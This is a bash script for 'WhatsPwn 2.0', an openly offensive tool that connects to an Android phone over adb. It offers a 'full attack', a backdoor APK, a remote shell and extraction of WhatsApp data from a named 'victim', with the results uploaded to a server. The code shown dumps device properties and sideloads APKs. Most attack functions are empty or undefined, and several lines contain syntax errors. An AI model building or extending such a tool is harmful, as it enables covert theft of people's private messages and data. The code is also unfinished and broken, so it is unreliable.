#!/bin/bash

##############################################################################
# WhatsPwn 2.0 Copyright (C) 2016  José Luis Rodríguez Fragoso                            #
#                                                                            #
#    This program is free software: you can redistribute it and/or modify    #
#    it under the terms of the GNU General Public License as published by    #
#    the Free Software Foundation, either version 3 of the License, or       #
#    (at your option) any later version.                                     #
#                                                                            #
#    This program is distributed in the hope that it will be useful,         #
#    but WITHOUT ANY WARRANTY; without even the implied warranty of          #
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the           #
#    GNU General Public License for more details.                            #
#                                                                            #
#    You should have received a copy of the GNU General Public License       #
#    along with this program.  If not, see <http://www.gnu.org/licenses/>.   #
#                                                                            #
#   José Luis Rodríguez Fragoso                                              #
#   jlrodriguezfragoso@gmail.com                                             #
##############################################################################

# COLOR MATCHING
NONE='\033[0m'
BOLD='\033[1m'
RED='\033[0;31m'
GREEN='\033[0;32m'
CYAN='\033[0;36m'
#######################################################################################################################
#                                                    SUBFUNCTIONS                                                     #
#######################################################################################################################
# CHECK IF AUTO MODE IS ENABLED, IF SO, PROMPT FOR ALL CONFIGURATION VARIABLES.
CHKAUTO() {
	if [[ ${AUTOMODE} == "1" ]]; then
		# IF THE OPTION CHOSEN BEFORE WAS JUST EXTRACTION
		if [[ ${MENU} -eq 5 ]] || [[ ${MENU} -eq 6]]; then
			NAME_PROMPT
			DCIM_PROMPT
			BACKUP_PROMPT
			UPLOAD_PROMPT
			case "UPLOADYN" in
				Y|y|yes|YES) SSHPASS_PROMPT ;;
			esac
		# IF IT WAS FULL
		else
			BACKDOOR_PROMPT
			BLACKHOLE_PROMPT
			NAME_PROMPT
			case "$BACKHOLE" in
				Y|y|yes|YES) DCIM_PROMPT ;;
			esac
			BACKUP_PROMPT
			UPLOAD_PROMPT
			case "UPLOADYN" in
				Y|y|yes|YES) SSHPASS_PROMPT ;;
			esac
		fi
	fi
}
#######################################################################################################################
#                                                   MAIN FUNCTIONS                                                    #
#######################################################################################################################
#FULL ATTACK ### UNFINISHED
FULL_ATTACK() {
	if [[ -n "$CONNECTED" ]]; then
		continue
	else
		CONNECTION_ERROR
	fi
	if [[ -z "$NAME" ]]; then
		NAME_PROMPT
	fi
	mkdir -pv ${PATHEXT}extracted/${NAME}
	echo -e "${BOLD}GETTING DEVICE INFO ... ${GREEN}[OK]${NONE}"
	${WDIR}/bin/adb shell getprop > ${PATHEXT}extracted/${NAME}/DeviceInfo.txt
	echo -e "${BOLD}INSTALLING AntiGuard Tool by [Kosborn] ... ${GREEN}[OK]${NONE}"
	${WDIR}/bin/adb install ${WDIR}/bin/AntiGuard.apk
}
# RELAUNCH BACKDOOR


# LAUNCH SHELL


# EMERGENCY RESTORE WHATSAPP


# EXTRACTION


# UPLOAD FILES


# CREATE PAYLOAD


#######################################################################################################################
#                                                     INTERFACE                                                       #
#######################################################################################################################
# MAIN INTERFACE IF -i OPTION PASSED THROUGH
INTERFACE() {
	clear
	# LICENSE AGREEMENT PROMPT
	while true; do
		if grep "I accept" .LicenseAgreed; then
			break
		else
			clear
			cat << EOF > LicenseAgreement
WhatsPwn  Copyright (C) 2016  José Luis Rodríguez Fragoso
This program comes with ABSOLUTELY NO WARRANTY; for details type 'w'.
This is free software, and you are welcome to redistribute it
under certain conditions; type 'c' for details.
EOF
			# DISPLAY LICENSE AGREEMENT PROMPT
			cat LicenseAgreement
			echo -e -n "\n${BOLD}Do you accept the rights? ${NONE}${BOLD}[Y/N/W/C]: ${NONE}"
			read license
		        case "$license" in
		        	# OPTIONS AND ARGUMENTS FOR LICENSE
		        	Y|y|yes|YES|Yes|yES|yeS|YEs|YeS) cat << EOF > .LicenseAgreed
I accept
EOF
					break ;;
		        	N|n|NO|no|No|nO) echo "I do NOT accept" > .LicenseAgreed && exit ;;
					# WARRANTY W OPTION
		        	W|w) echo -e "\n" && cat << EOF > LicenseAgreement
THERE IS NO WARRANTY FOR THE PROGRAM, TO THE EXTENT PERMITTED BY
APPLICABLE LAW.  EXCEPT WHEN OTHERWISE STATED IN WRITING THE COPYRIGHT
HOLDERS AND/OR OTHER PARTIES PROVIDE THE PROGRAM "AS IS" WITHOUT WARRANTY
OF ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING, BUT NOT LIMITED TO,
THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR
PURPOSE.  THE ENTIRE RISK AS TO THE QUALITY AND PERFORMANCE OF THE PROGRAM
IS WITH YOU.  SHOULD THE PROGRAM PROVE DEFECTIVE, YOU ASSUME THE COST OF
ALL NECESSARY SERVICING, REPAIR OR CORRECTION.
EOF
					cat LicenseAgreement && echo -e -n "\nPress any key to continue ..." && read -n 1;;
				# FULL LICENSE C OPTION [CONDITIONS]
				C|c) cat LICENSE | less && echo -e -n "\nPress any key to continue ..." && read -n 1;;
				esac
		fi
	done
# END OF LICENSE AGREEMENT PROMPT

# INTERFACE INIT
	clear
	cat ${WDIR}/bin/motd
	echo -e "\n                                                 DEVICE STATUS: ${STATUS}"
	echo -e "\n${BOLD}WHAT DO YOU WANT TO DO?${CYAN}\n
	1) START FULL ATTACK
	2) RELAUNCH BACKDOOR APK
	3) LAUNCH SHELL
	4) EMERGENCY RESTORE WHATSAPP (IN CASE OF ERROR)
	5) JUST RUN EXTRACTION (REMOTE)
	6) JUST RUN EXTRACTION (LOCAL)
	7) UPLOAD FILES TO SERVER
	8) CREATE A PAYLOAD
	x) EXIT${NONE}"
	echo -e -n "\n${CYAN}WAP${NONE}>"
	read MENU
	case "$MENU" in
		1) CHKAUTO && FULL_ATTACK ;;
		2) BD2 && INTERFACE ;;
		3) SHELL && INTERFACE ;;
		4) ${WDIR}/bin/adb wait-for-device && ${WDIR}/bin/adb install -r -d ${WDIR}bin/WhatsApp_Backup.apk && INTERFACE ;;
		5) CHKAUTO && BHRMANUAL ;;
		6) CHKAUTO && BHL ;;
		7) UPLOAD ;;
		# ADDED PAYLOAD CREATION
		8) PAYLOAD ;;
		x|X) exit 0 ;;
		*) echo -e "${RED}THAT IS NOT A VALID OPTION...TRY AGAIN${NONE}" && INTERFACE ;;
	esac
}
#######################################################################################################################
#                                                 MAIN CONFIGURATION                                                  #
#######################################################################################################################
# ENABLE CLEANLY EXIT WITH CTRL+C
clear

# DETERMINE IF USER IS ROOT
if [ "`id -u`" -eq 0 ]; then
	id=root
else
	echo -e "\n${RED}YOU NEED TO BE ROOT.${NONE}"
fi

# DETERMINE DIRECTORY OF THIS SCRIPT.
WDIR="`dirname \"$0\"`"          # RELATIVE PATH
WDIR=$(cd ${WDIR} && pwd)  # ABSOLUTE AND NORMALIZED PATH
# IF ERROR [VARIABLE NOT SET] RETURN ERROR
if [ -z "$WDIR" ] ; then
	echo -e "\n${RED}CANNOT DETERMINE SCRIPT DIRECTORY.${NONE}"
	exit 1
fi

# DEFINE IF SSHPASS DEPENDENCY EXISTS, IF NOT, INSTALL IT
if ! type sshpass > /dev/null; then
	echo -e "${BOLD}${RED}SSHPASS NOT FOUND, ${NONE}INSTALLING IT ... ${GREEN}[OK]${NONE}"
	apt-get install sshpass -y
fi

# LOAD CONFIG FILES
. ${WDIR}/config
. ${WDIR}/server

# CREATE TEMPORARY DIRECTORY 
mkdir ${WDIR}/tmp/ > /dev/null

# ATTEMPT CONNECTION TO DEVICE IN BACKGROUND
# EXPORT RESULT OF 'adb devices' COMMAND TO A FILE
${WDIR}/bin/adb wait-for-device > /dev/null
echo -e "${BOLD}CONNECT THE DEVICE${NONE}"
${WDIR}/bin/adb devices > ${WDIR}/tmp/ADB_Devices
# IF THE FILE CONTAINS AN IP, SET IT AS VARIABLE
IP=$(grep -oE "[0-9]{1,3}(\.[0-9]{1,3}){3}" ${WDIR}/tmp/ADB_Devices)
# IF IP VARIABLE IS SET THEN IT IS CONNECTED WIRELESSLY
if [[ -n "$IP" ]]; then
	CONNECTED=1
	STATUS="${GREEN}CONNECTED${NONE} IP = [${CYAN}${IP}${NONE}]"
else
	# IF IP IS NOT SET, CHECK IF DEVICES IS CONNECTED LOCALLY ONLY
	if [ grep -oE "device" ${WDIR}/tmp/ADB_Devices ]; then
		# IF TRUE, SET CONNECTED
		CONNECTED=1
		STATUS="${GREEN}CONNECTED ${CYAN}LOCALLY"
	fi
	# IF NOT DISPLAY DISCONNECTED
	STATUS="${RED}DISCONNECTED${NONE}"
fi
#######################################################################################################################
#                                                  ARGUMENT PARSER                                                    #
#######################################################################################################################
if [[ $# > 0 ]]; then
	option="$1"
	case "$option" in
		# FULL ATTACK
		FULL|1|full) if [[ $# > 1 ]]; then
						shift
						while [[ $# > 0 ]]; do
							option="$1"
							case "$option" in
								# SUBOPTIONS FOR FULL ATTACK
								-b|--use-backdoor|--backdoor) BACKDOOR="Y" && shift ;;
								-e|--black-hole|--use-black-hole) BLACKHOLE="Y" && shift ;;
								-v|--victim) NAME="$2" && shift 2 ;;
								-d|--DCIM|--dcim) DCIM="Y" && shift ;;
								-k|--backup) BACKUPZIPNAME="$2" && shift 2 ;;
								-u|--upload) UPLOADYN="Y" && SSHPASSMENU && shift ;;
								-h|--help) cat ${WDIR}/bin/USAGE && shift ;;
								-o|--output) PATH="$2" && shift 2 ;;
								*) cat ${WDIR}/bin/USAGE && break ;;
							esac
						done
					fi && WHATSPWNREMOTE ;;
		# RELAUNCH BACKDOOR
		RELAUNCH|2|relaunch) BD2 && cd ${HOME} ;;
		# LAUNCH REMOTE SHELL IF POSSIBLE, IF NOT LAUNCH LOCAL SHELL
		SHELL|3|shell) SHELL && cd ${HOME} ;;
		# RESTORE WHATSAPP IN CASE OF ERROR
		RESTORE|4|restore) bin/adb wait-for-device && bin/adb install -r -d bin/WhatsApp_Backup.apk && cd ${HOME} ;;
		# EXTRACT SENSITIVE DATA ONLY [NOT WHATSAPP DATABASE]
		EXTRACTION|5|extraction) if [[ $2 == "local" ]]; then # EXTRACTION SUBOPTIONS
									# LOCAL EXTRACTION
									if [[ $# > 2 ]]; then
										shift 2
										while [[ $# > 0 ]]; do
											option="$1"
											case "$option" in
												-v|--victim) NAME="$2" && shift 2 ;;
												-d|--DCIM|--dcim) DCIM="Y" && shift ;;
												-k|--backup) BACKUPZIPNAME="$2" && shift 2 ;;
												-u|--upload) UPLOADYN="Y" && SSHPASSMENU && shift ;;
												-h|--help) cat ${WDIR}/bin/USAGE && shift ;;
												-o|--output) PATH="$2" && shift 2 ;;
												*) cat ${WDIR}/bin/USAGE && break ;;
											esac
										done
										BHL
									else
										BHL
									fi
								 fi 
								 # REMOTE EXTRACTION
								 if [[ $2 == "remote" ]]; then
								 	if [[ $# > 2 ]]; then
										shift 2
										while [[ $# > 0 ]]; do
											option="$1"
											case "$option" in
												-v|--victim) NAME="$2" && shift ;;
												-d|--DCIM|--dcim) DCIM="Y" && shift ;;
												-k|--backup) BACKUPZIPNAME="$2" && shift ;;
												-u|--upload) UPLOADYN="Y" && SSHPASSMENU && shift ;;
												-h|--help) cat ${WDIR}/bin/USAGE && shift ;;
												-o|--output) PATH="$2" && shift ;;
												*) cat ${WDIR}/bin/USAGE && break ;;
											esac
										done
										BHRMANUAL
									else
										BHRMANUAL
									fi
								 fi && cat ${WDIR}/bin/USAGE ;;
		# UPLOAD EXTRACTED FILES TO SERVER
		UPLOAD|6|upload) UPLOAD && cd ${HOME};;
		# LAUNCH CLI INTERFACE
		-i|--interface|INTERFACE|8|i) USEINTERFACE="Y" && INTERFACE && break ;;
		-v|--version|version) echo "WhatsPwn 2.0" && exit 0
		# ANY OTHER OPTION
		*) cat ${WDIR}/bin/USAGE ;;
	esac
else
	# IF NO OPTIONS GIVEN
	cat ${WDIR}/bin/USAGE
fi
# EXIT WITHOUT ERRORS
exit 0
#######################################################################################################################
